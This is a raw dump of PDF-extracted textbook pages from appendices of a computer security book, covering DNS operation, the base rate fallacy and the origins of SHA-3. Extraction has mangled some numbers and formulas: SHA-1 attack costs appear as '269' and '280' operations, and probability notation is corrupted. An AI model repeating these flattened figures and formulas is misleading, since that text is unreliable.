Search Commands\\n9 Library of Congress General Information\\n10 Library of Congress Fast Facts\\n12 Comments and Logoff\\nChoice:\\n9\\nLIBRARY OF CONGRESS GENERAL INFORMATION\\nLC is a research library serving Congress, the federal \\n government, \\nthe library community world-wide, the US creative community, and \\nany researchers beyond high school level or age. On-site researchers \\nrequest materials by filling out request slips in LC’s reading rooms; \\n requesters \\nmust \\n present a photo \\ni.d. Staff are available for \\n assistance \\nin all \\n public reading rooms.\\n----------------------------------------------------------------\\nThe following phone numbers offer information about hours and other \\nservices:\\nGeneral Research Info: 202–707-6500 Reading Room Hours: 202–707-6400\\nExhibits/Tours/Gift Shop: 202–707-8000 Location/Parking: 202–707-4700\\nFigure H.4  A T elnet Session\\nSource: Library Of Congress Information System\\nZ11_STAL0611_04_GE_APPH.indd   7 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 949, 'page_label': 'H-8'}, page_content='H-8  APPENDIX H / THE DOMAIN NAME SYSTEM\\nThe distributed DNS database that supports the DNS functionality must be \\nupdated frequently because of the rapid and continued growth of the Internet. \\nFurther, the DNS must cope with dynamic assignment of IP addresses, such as is \\ndone for home DSL users by their ISP . Accordingly, dynamic updating functions \\nfor DNS have been defined. In essence, DNS name servers automatically send out \\nupdates to other relevant name servers as conditions warrant.\\nThe Server Hierarchy\\nThe DNS database is distributed hierarchically, residing in DNS name servers \\nscattered throughout the Internet. Name servers can be operated by any organiza-\\ntion that owns a domain or subdomain; that is, any organization that has respon-\\nsibility for a subtree of the hierarchical domain name space. Each name server \\nis configured with a subset of the domain name space, known as a zone, which is \\na collection of one or more (or all) subdomains within a domain, along with the \\nassociated RRs. This set of data is called authoritative, because this name server is \\nresponsible for maintaining an accurate set or RRs for this portion of the domain \\nname hierarchy. The hierarchical structure can extend to any depth. Thus, a portion \\nof the name space assigned to an authoritative name server can be delegated to a \\nsubordinate name server in a way that corresponds to the structure of the domain \\nname tree. For example, a name server corresponds to the domain ibm.com. A por-\\ntion of that domain is defined by the name watson.ibm.com, which corresponds to \\nthe node watson.ibm.com and all of the branches and leaf nodes underneath the \\nnode watson.ibm.com.\\nAt the top of the server hierarchy are 13 root name servers that share respon-\\nsibility for the top-level zones (see \\nTable H.3). This replication is to prevent the root \\nserver from becoming a bottleneck, and for reliability. Even so, each individual root \\nserver is quite busy. For example, the Internet Software Consortium reports that \\nits server (F) answers almost 300 million DNS requests daily (www.isc.org/services/\\npublic/F-root-server.html). Note that some of the root servers exist as multiple serv-\\ners that are geographically distributed. When there are multiple root servers with \\nthe same name, each has an identical copy of the database for that server and the \\nsame IP address. When a query is made to that root server, the IP routing protocol \\nand algorithm directs the query to the most convenient server, which is generally the \\nnearest server physically.\\nCopyright Information: 202–707-3000 Cataloging Products: 202–707-6100\\nCopyright Forms: 202–707-9100 ““fax: 202–707-1334\\n----------------------------------------------------------------\\nFor information on interlibrary loan, see: http://lcweb.loc.gov/rr/loan/\\n12 Return to LOCIS MENU screen\\nChoice:\\nFigure H.4 A Telnet Session\\nZ11_STAL0611_04_GE_APPH.indd   8 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 950, 'page_label': 'H-9'}, page_content='H.3 / DNS OPERATION  H-9\\nConsider a query by a program on a user host for watson.ibm.com. This query \\nis sent to the local server and the following steps occur:\\n1. If the local server already has the IP addr\\ness for watson.ibm.com in its local \\ncache, it returns the IP address.\\n2. If the name is not in the local name server’s cache\\n, it sends the query to a root \\nserver. The root server in turn forwards the request to a server with an NS record \\nfor ibm.com. If this server has the information for watson.ibm.com, it returns the \\nIP address.\\n3. If there is a delegated name server just for watson.ibm.com, then the ibm.com \\nname server forwards the request to the watson.ibm.com name server, which \\nreturns the IP address.\\nTypically, single queries are carried over UDP . Queries for a group of names \\nare carried over TCP .\\nName Resolution\\nAs Figure H.3 indicates, each query begins at a name resolver located in the user \\nhost system (e.g., gethostbyname in UNIX). Each resolver is configured to know \\nthe name and address of a local DNS name server. If the resolver does not have the \\nrequested name in its cache, it sends a DNS query to the local DNS server, which \\nServer Operator Cities IP Addr\\nA VeriSign Global Registry Services Herndon VA, US 198.41.0.4\\nB Information Sciences Institute Marina Del Rey CA, US 128.9.0.107\\nC Cogent Communications Herndon VA, US 192.33.4.12\\nD University of Maryland College Park MD, US 128.8.10.90\\nE NASA Ames Research Center Mountain View CA, US 192.203.230.10\\nF Internet Software Consortium Palo Alto CA, US;\\nSan Francisco CA, US\\nIPv4: 192.5.5.241\\nIPv6: 2001:500::1035\\nG U.S. DOD Network Information \\nCenter\\nVienna VA, US 192.112.36.4\\nH U.S. Army Research Lab Aberdeen MD, US 128.63.2.53\\nI Autonomica Stockholm, SE 192.36.148.17\\nJ VeriSign Global Registry Services Herndon VA, US 192.58.128.30\\nK Reseaux IP Europeens - Network \\nCoordination Centre\\nLondon, UK 193.0.14.129\\nL Internet Corporation for Assigned \\nNames and Numbers\\nLos Angeles CA, US 198.32.64.12\\nM WIDE Project Tokyo, JP 202.12.27 .33\\nTable H.3   Internet Root Serv ers\\nZ11_STAL0611_04_GE_APPH.indd   9 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 951, 'page_label': 'H-10'}, page_content='H-10  APPENDIX H / THE DOMAIN N AME SYSTEM\\neither returns an address immediately or does so after querying one or more other \\nservers. Again, resolvers use UDP for single queries and TCP for group queries.\\nThere are two methods by which queries are forwarded and results returned. \\nSuppose a resolver issues a request to local name server (A). If A has the name/\\naddress in its local cache or local database, it can return the IP address to the \\nresolver. If not, then A can do either of the following:\\n1.\\n Query another name server for the desir\\ned result and then send the result back \\nto A. This is known as a recursive technique.\\n2.\\n R\\neturn to A the address of the next server (C) to whom the request should be \\nsent. A then sends out a new DNS request to C. This is known as the iterative \\ntechnique.\\nIn exchanges between name servers, either the iterative or recursive technique \\nmay be used. For requests sent by a name resolver, the recursive technique is used.\\nDNS Messages\\nDNS messages use a single format shown in Figure H.5. There are five possible sec-\\ntions to a DNS message: header, question, answer, authority, and additional records.\\nFigure H.5 DNS Message F ormat\\nIdentitiﬁer\\nQDcount\\nNScount\\nlength label 1 . . .\\nAnswer Section\\nHeader\\nSection\\nQuestion\\nSection\\nDomain\\nName\\nAuthority Section\\nAdditional Records Section\\n. . . label n 00\\nANcount\\nQuery Type Query Class\\nARcount\\nQR opcode AA TC RD RA RCODEreserved\\nQR = query/response bit\\nAA = authoritative answer\\nTC = truncated\\nRD = recursion desiredRA = recursion available\\nRCODE = response code\\nQDcount = number of entries in question section\\nANcount = number of resource records in answer section\\nNScount = number of name server resource records in authority sectionARcount = number of resource records in additional records section\\n0 8 16 2421 3128\\nZ11_STAL0611_04_GE_APPH.indd   10 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 952, 'page_label': 'H-11'}, page_content='H.3 / DNS OPERATION  H-11\\nThe header section is always present and consists of the following fields:\\n• Identifier: Assigned by the progr\\nam that generates any kind of query. The same \\nidentifier is used in any response, enabling the sender to match queries and \\nresponses.\\n• Query Response: Indicates whether this message is a query or response\\n.\\n• Opcode: Indicates whether this is a standard query\\n, an inverse query (address \\nto name), or a server status request. This value is set by the originator and cop-\\nied into the response.\\n• Authoritativ\\ne Answer: Valid in a r\\nesponse and indicates whether the respond-\\ning name server is an authority for the domain name in question.\\n• Trunc\\nated: Indicates whether the response message was truncated due to\\n \\nlength greater than permitted on the transmission channel. If so, the requestor \\nwill use a TCP connection to resend the query.\\n• Recursion Desir\\ned: If set, dir\\nects the server to pursue the query recursively.\\n• Recursion \\nAvailable: Set or \\ncleared in a response to denote whether recursive \\nquery support is available in the name server.\\n• Response Code: Possible v\\nalues are no error, format error (server unable to \\ninterpret query), server failure, name error (domain name does not exist), not \\nimplemented (this kind of query is not supported), and refused (for policy \\nreasons).\\n• QDcount: Number of entries in question section (zero or mor\\ne)\\n• ANcount: Number of RRs in answer section (zero or mor\\ne)\\n• NScount: Number of RRs in authority section (zero or mor\\ne)\\n• ARcount: Number of RRs in additional recor\\nds section (zero or more)\\nThe question section contains the queries for the name server. If present, it \\ntypically contains only one entry. Each entry contains the following:\\n• Doma\\nin Name: A domai\\nn name represented as a sequence of labels, where \\neach label consists of a length octet followed by that number of octets. The \\ndomain name terminates with the zero-length octet for the null label of the root.\\n• Query Type: Indicates type of query. The values for this field include all values \\nvalid for the Type field in the RR format (see \\nFigure H.2), together with some \\nmore general codes that match more than one type of RR.\\n• Query Class: Specifies the class of query,\\n typically the Internet.\\nThe answer section contains RRs that answer the preceding question; the  authority \\n section \\ncontains RRs that point toward an authoritative name server; the  additional \\nr\\necords section contains RRs that relate to the query but are not strictly answers \\nfor the question.\\nZ11_STAL0611_04_GE_APPH.indd   11 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 953, 'page_label': 'I-1'}, page_content='I-1\\nAPPENDIX I\\nThE BAsE RATE FAllAcy\\nI.1 Conditional Probability and Independence\\nI.\\n2\\n Bayes’ Theorem\\nI.\\n3\\n The Base Rate Fallacy Demonstrated\\nI.\\n4\\n References\\nZ12_STAL0611_04_GE_APPI.indd   1 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 954, 'page_label': 'I-2'}, page_content='I-2  APPENDIX I / THE B ASE RATE FALLACY\\nWe begin with a review of important results from probability theory, then demon-\\nstrate the base rate fallacy.\\n I. 1  CONDITION AL PROBABILITY AND INDEPENDENCE\\nWe often want to know a probability that is conditional on some event. The \\neffect of the condition is to remove some of the outcomes from the sample \\nspace. For example, what is the probability of getting a sum of 8 on the roll of \\ntwo dice if we know that the face of at least one die is an even number? We \\ncan reason as follows. Because one die is even and the sum is even, the \\n se\\ncond \\ndie must show an even number. Thus, there are three equally likely suc-\\ncessful outcomes: (2, 6), (4, 4), and (6, 2), out of a total set of possibilities of \\n[36 - (number of events with both faces odd)] = 36 - (3 * 3) = 27. The resulting \\nprobability is 3/27 = 1/9.\\nFormally, the conditional probability  of an event A assuming the event B has \\noccurred, denoted by Pr[A/H20841B], is defined as the ratio\\nPr[A/H20841B] = Pr[AB]\\nPr[B]\\nwhere we assume Pr[B] is not zero.\\nIn our example, A = 5sum of 86 and B = 5at least one die even6.\\xa0The\\xa0quan-\\ntity Pr[AB] encompasses all of those outcomes in which the sum is 8 and at \\nleast one die is even. As we have seen, there are three such outcomes. Thus,  \\nPr[AB] = 3/36 = 1/12. A moment’s thought should convince you that Pr[B] = 3/4. \\nWe can now calculate\\nPr[A/H20841B] = 1/12\\n3/4 = 1\\n9\\nThis agrees with our previous reasoning.\\nTwo events A  and B  are called independent if Pr[AB] = Pr[A]Pr[B]. \\nIt can easily be seen that if A  and B  are independent, Pr[A/H20841B] = Pr[A] and \\nPr[B/H20841A] = Pr[B].\\n I. 2  B AYES’ THEOREM\\nOne of the most important results from probability theory is known as Bayes’ \\ntheorem. First, we need to state the total probability formula. Given a set of \\nmutually exclusive events E1, E2, c, En, such that the union of these events \\ncovers all possible outcomes, and given an arbitrary event A , then it can be \\nshown that\\n Pr[A] = a\\nn\\ni =1\\n Pr[A/H20841Ei]Pr[Ei] (I.1)\\nZ12_STAL0611_04_GE_APPI.indd   2 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 955, 'page_label': 'I-3'}, page_content='I.2 / BAYES’ THEOREM  I-3\\nBayes’ theorem may be stated as follows:\\n Pr[Ei /H20841A] = Pr[A/H20841Ei]P[Ei]\\nPr[A] = Pr[A/H20841Ei]P[Ei]\\na\\nn\\nj =1\\nPr[A/H20841Ej]Pr[Ej]\\n (I.2)\\nF\\nigure I.1a illustrates the concepts of total probability and Bayes’ theorem.\\nBayes’ theorem is used to calculate “posterior odds,” that is, the probability \\nthat something really is the case, given evidence in favor of it. For example, sup-\\npose we are transmitting a sequence of zeroes and ones over a noisy transmission \\nline. Let S0 and S1 be the events a zero is sent at a given time and a one is sent, \\nrespectively, and R0 and R1 be the events that a zero is received and a one is \\nreceived. Suppose we know the probabilities of the source, namely Pr[S1] = p and \\nPr[S0] = 1 - p. Now the line is observed to determine how frequently an error \\noccurs when a one is sent and when a zero is sent, and the following probabilities \\nare calculated: Pr[R0/H20841S1] = pa and Pr[R1/H20841S0] = pb. If a zero is received, we can \\nthen calculate the conditional probability of an error, namely the conditional prob-\\nability that a one was sent given that a zero was received, using Bayes’ theorem:\\nPr[S1/H20841R0] = Pr[R0/H20841S1]Pr[S1]\\nPr[R0/H20841S1]Pr[S1] + Pr[R0/H20841S0]Pr[S0] = pap\\npap + (1 - pb)(1 - p)\\nFigure I.1b illustrates the preceding equation. In the figure, the sample space \\nis represented by a unit square. Half of the square corresponds to S0 and half to S1, \\nso Pr[S0] = Pr[S1] = 0.5. Similarly, half of the square corresponds to R0 and half \\nto R1, so Pr[R0] = Pr[R1] = 0.5. Within the area representing S0, one quarter of \\nFigure  I.1  Illustration of Total Probability and Bayes’ Theorem\\nA\\nE1 E2\\nE3 E4\\n= S0; 0 sent\\n= S1; 1 sent\\n= R0; 0 received\\n(b) Example(a) Diagram to illustrate concepts\\n= R1; 1 received\\nZ12_STAL0611_04_GE_APPI.indd   3 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 956, 'page_label': 'I-4'}, page_content='I-4  APPENDIX I / THE B ASE RATE FALLACY\\nthat area corresponds to R1, so Pr[R1/S0] = 0.25. Other conditional probabilities \\nare similarly evident.\\n I. 3  THE B ASE RATE FALLACY DEMONSTRATED\\nConsider the following situation. A patient has a test for some disease that comes \\nback positive (indicating he has the disease). You are told the following:\\n•\\n T\\nhe accuracy of the test is 87% (i.e., if a patient has the disease, 87% of the time, \\nthe test yields the correct result, and if the patient does not have the disease, \\n87% of the time, the test yields the correct result).\\n•\\n T\\nhe incidence of the disease in the population is 1%.\\nGiven that the test is positive, how probable is it that the patient does not \\nhave the disease? That is, what is the probability that this is a false alarm? We need \\nBayes’ theorem to get the correct answer:\\n Pr[well/positive] = Pr[positive/well]Pr[well]\\nPr[positive/disease]Pr[disease] + Pr[positive/well]Pr[well]\\n = (0.13)(0.99)\\n(0.87)(0.01) + (0.13)(0.99) = 0.937\\nThus, in the vast majority of cases, when a disease condition is detected, it is \\na false alarm.\\nThis problem, used in a study [PIAT91, PIAT94], was presented to a num-\\nber of people. Most subjects gave the answer 13%. The vast majority, including \\nmany physicians, gave a number below 50%. Many physicians who guessed wrong \\nlamented, “If you are right, there is no point in making clinical tests!” The reason \\nmost people get it wrong is that they do not take into account the basic rate of \\nincidence (the base rate) when intuitively solving the problem. This error is known \\nas the base rate fallacy [BARH80].\\nHow could this problem be fixed? Suppose we could drive both of the cor -\\nrect result rates to 99.9%. That is, suppose we have Pr[positive/disease] = 0.999 \\nand Pr[negative/well] = 0.999. Plugging these numbers into the Equation (I.2), \\nwe get Pr[well/positive] = 0.09. Thus, if we can accurately detect disease and accu-\\nrately detect lack of disease at a level of 99.9%, then the rate of false alarms will \\nbe 9%. This is much better, but still not ideal. Moreover, again assume 99.9% \\naccuracy, but now suppose the incidence of the disease in the population is only \\n1/10000 = 0.0001. We then end up with a rate of false alarms of 91%. In actual \\nsituations, [AXEL00] found that the probabilities associated with IDSs were such \\nthat the false alarm rate was unsatisfactory.\\nZ12_STAL0611_04_GE_APPI.indd   4 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 957, 'page_label': 'I-5'}, page_content='I.4 / REFERENCES   I-5\\nAXEL00 Axelsson,  S. “The Base-Rate Fallacy and the Difficulty of Intrusion \\nDetection.” ACM Transactions and Information and System Security, August 2000.\\nBARH80\\n B\\nar-Hillel, M. “The Base-Rate Fallacy in Probability Judgements.” Acta \\nPsychologica, May 1980.\\nPIAT91\\n Piat\\ntelli-Palmarini, M. “Probability: Neither Rational nor Capricious.” \\nBostonia, March 1991.\\nPIAT94\\n Piat\\ntelli-Palmarini, M. Inevitable Illusions: How Mistakes of Reason Rule \\nOur Minds. New York: Wiley, 1994.\\n I. 4  REFERENCES\\nZ12_STAL0611_04_GE_APPI.indd   5 10/11/17   3:39 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 958, 'page_label': 'J-1'}, page_content='J-1\\nAPPENDIX J\\nSHA-3\\nJ.1 The Origins of S HA-3\\nJ.2\\n Evaluation Criteria for SHA-3\\nJ.\\n3\\n The Sponge Construction\\nJ.\\n4\\n The S\\nHA-3 Iteration Function f\\nStructure of f\\nTheta Step Function\\nRho Step Function\\nPi Step Function\\nChi Step Function\\nIota Step Function\\nJ.5\\n Recommended Reading and References\\nR\\neferences\\nZ13_STAL0611_04_GE_APPJ.indd   1 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 959, 'page_label': 'J-2'}, page_content='J-2  APPENDIX J / SHA-3\\nThe winning design for the Secure Hash Algorithm 3 (SHA-3) was announced by \\nNIST (National Institute of Standards and Technology) in October 2012. SHA-3 is a \\ncryptographic hash function that is intended to complement SHA-2 as the approved \\nstandard for a wide range of applications. In this chapter, we first look at the evalu-\\nation criteria used by NIST to select a candidate then examine the hash function \\nitself.\\n J.1  THE ORIGINS OF SHA-3\\nIn 2005, NIST announced the intention to phase out approval of SHA-1 and move to \\na reliance on SHA-2 by 2010. Shortly thereafter, a research team described an attack \\nin which two separate messages could be found that deliver the same SHA-1 hash \\nusing 269 operations, far fewer than the 280 operations previously thought needed to \\nfind a collision with an SHA-1 hash [WANG05]. This result has hastened the transi-\\ntion to SHA-2.\\nSHA-2, particularly the 512-bit version, would appear to provide unassailable \\nsecurity. However, SHA-2 shares the same structure and mathematical operations as \\nits predecessors, and this is a cause for concern. Because it will take years to find a \\nsuitable replacement for SHA-2, should it become vulnerable, NIST decided to begin \\nthe process of developing a new hash standard.\\nAccordingly, NIST announced in 2007 a competition to produce the next gen-\\neration NIST hash function, to be called SHA-3. The basic requirements that must \\nbe satisfied by any candidate for SHA-3 are the following:\\n1.\\n It must be possible to r\\neplace SHA-2 with SHA-3 in any application by a simple \\ndrop-in substitution. Therefore, SHA-3 must support hash value lengths of 224, \\n256, 384, and 512 bits.\\n2.\\n SHA\\n-3 must preserve the online nature of SHA-2. That is, the algorithm \\nmust process comparatively small blocks (512 or 1024 bits) at a time instead \\nof requiring that the entire message be buffered in memory before process-\\ning it.\\nNIST received 64 entries by October 31, 2008; and selected 51 candidate \\nalgorithms to advance to the first round on December 10, 2008, and 14 to advance \\nto the second round on July 24, 2009. Based on the public feedback and inter -\\nnal reviews of the second-round candidates, NIST selected five SHA-3 finalists \\nto advance to the third (and final) round of the competition on December 9, \\n2010. NIST completed its evaluation process and announced a final standard in \\n2012. NIST selected Keccak for the SHA-3 algorithm. Keccak was designed by a \\nteam of cryptographers from Belgium and Italy: Guido Bertoni, Joan Daemen,1 \\n1Joan Daemen is one of the two designers of Rijndael, the winner of the AES competition a decade earlier.\\nZ13_STAL0611_04_GE_APPJ.indd   2 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 960, 'page_label': 'J-3'}, page_content='J.2 / EVALUATION CRITERIA FOR SHA-3  J-3\\nMichaël\\xa0Peeters, and Gilles Van Assche. In their announcement, NIST explained \\nthe choice as follows:\\nNIST chose KECCAK over the four other excellent finalists for its elegant \\ndesign, large security margin, good general performance, excellent efficiency in \\nhardware implementations, and for its flexibility. KECCAK uses a new “sponge \\nconstruction” chaining mode, based on a fixed permutation, that can readily be \\nadjusted to trade generic security strength for throughput, and can generate \\nlarger or smaller hash outputs as required. The KECCAK designers have also \\ndefined a modified chaining mode for KECCAK that provides authenticated \\nencryption.\\nThe role of SHA-3 is somewhat different from that of AES. In the case of AES, \\nNIST approved AES as a replacement for DEA and 3DEA. Although 3DEA is \\nstill considered secure, it is not efficient and has a smaller key length than one of \\nthe AES options. On the other hand, SHA-2 has held up well and NIST considers \\nit secure for general use. So SHA-3 is a complement or alternative to SHA-2 rather \\nthan a replacement. The relatively compact nature of SHA-3 may make it useful for \\nso-called “embedded” or smart devices that connect to electronic networks but are \\nnot themselves full-fledged computers. Examples include sensors in a building-wide \\nsecurity system and home appliances that can be remotely controlled.\\n J.2 EVALUATION CRITERIA FOR SHA-3\\nIt is worth examining the criteria used by NIST to evaluate potential candidates. \\nThese criteria span the range of concerns for the practical application of modern \\ncryptographic hash functions. When NIST issued its original request for candidate \\nalgorithm nominations in 2007 [NIST07], the request stated that candidate algorithms \\nwould be compared based on the factors shown in \\nTable J.1 (ranked in descending \\norder of relative importance). The three categories of criteria were:\\n1. Security: The ev\\naluation considered the relative security of the candidates \\ncompared to each other and to SHA-2. In addition, specific security require-\\nments related to various applications and resistance to attacks are included in \\nthis category.\\n2. Co\\nst: NI\\nST intends SHA-3 to be practical in a wide range of applications. \\nAccordingly, SHA-3 must have high computational efficiency, so as to be \\nusable in high-speed applications, such as broadband links, and low-memory \\nrequirements.\\n3. Algorithm and \\nimplementation characteristics: This \\ncategory includes a vari-\\nety of considerations, including flexibility; suitability for a variety of hardware \\nand software implementations; and simplicity, which will make an analysis of \\nsecurity more straightforward.\\nZ13_STAL0611_04_GE_APPJ.indd   3 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 961, 'page_label': 'J-4'}, page_content='J-4  APPENDIX J / SHA-3\\nSECURITY\\n•\\n \\nApplications of the hash function: Algorithms having the same hash length will be compared for the \\n security \\nthat ma\\ny be provided in a wide variety of cryptographic applications, including digital signatures (FIPS \\n186–2), key derivation (NIST SP 800–56A), hash-based message authentication codes (FIPS 198), and \\n deterministic r\\nandom bit generators (SP 800–90).\\n•\\n \\nSpecific requirements when hash functions are used to support HMAC, pseudorandom functions (PRFs), \\nand randomized hashing: The criteria list specific security requirements for these applications.\\n•\\n \\nAddition security requirements: Specific collision and preimage resistant criteria.\\n•\\n \\nEvaluations relating to attack resistance: Hash algorithms will be evaluated against attacks or observations \\nthat may threaten existing or proposed applications, or demonstrate some fundamental flaw in the design, \\nsuch as exhibiting nonrandom behavior and failing statistical tests.\\n•\\n \\nOther consideration factors: The quality of the security arguments/proofs, the clarity of the documentation \\nof the algorithm, the quality of the analysis on the algorithm performed by the submitters, the simplicity of \\nthe algorithm, and the confidence of NIST and the cryptographic community in the algorithm’s long-term \\nsecurity may all be considered.\\nCOST\\n•\\n \\nComputational efficiency: Computational efficiency refers to the execution speed of the algorithm. The \\n ev\\naluation of the computational efficiency of the candidate algorithms will be applicable to both hardware \\nand software implementations. The Round 1 analysis by NIST will focus primarily on software implementa-\\ntions; hardware implementations will be addressed more thoroughly during the Round 2 analysis.\\n•\\n \\nMemory requirements: Memory requirements include such factors as gate counts for hardware \\n implementations\\n, and code size and RAM requirements for software implementations. The memory required \\nto implement a candidate algorithm—for both hardware and software implementations of the algorithm—\\nwill be considered during the evaluation process. The Round 1 analysis will focus primarily on software \\nimplementations; hardware implementations will be addressed more thoroughly during Round 2.\\n•\\n \\nFlexibility: Candidate algorithms with greater flexibility will meet the needs of more users than less flexible \\nalgorithms, and therefore, are preferable. However, some extremes of functionality are of little practical use \\n(e.g., extremely short message digest lengths)—for those cases, preference will not be given. Some examples \\nof “flexibility” may include (but are not limited to) the following:\\na.\\n T\\nhe algorithm has a tunable parameter, which allows the selection of a range of possible security/\\n \\nperformance tr\\nadeoffs.\\nb.\\n T\\nhe algorithm can be implemented securely and efficiently on a wide variety of platforms, including \\n constr\\nained environments, such as smart cards.\\nc.\\n Implementations of the algorithm can be par\\nallelized to achieve higher performance efficiency.\\nALGORITHM AND IMPLEMENTATION CHARACTERISTICS\\n•\\n \\nSimplicity: A candidate algorithm shall be judged according to relative simplicity of design.\\nSource: NIST95 National Institute of Standards and Technology. An Introduction to Computer Security: \\nThe NIST Handbook. Special Publication 800-12, October 1995. NIST National Institute of Standards and \\n T\\nechnology, United States Department of Commerce.\\nTable J.1   NIST Ev aluation Criteria for SHA-3\\n J.3  THE SPONGE CONSTR UCTION\\nThe underlying structure of SHA-3 is a scheme referred to by its designers as a sponge \\nconstruction [BERT07 , BERT11]. The sponge construction has the same general \\nstructure as other iterated hash functions. The sponge function takes an input mes-\\nsage and partitions it into fixed-size blocks. Each block is processed in turn with the \\noutput of each iteration fed into the next iteration, finally producing an output block.\\nZ13_STAL0611_04_GE_APPJ.indd   4 10/11/17   3:40 PM'),\n",
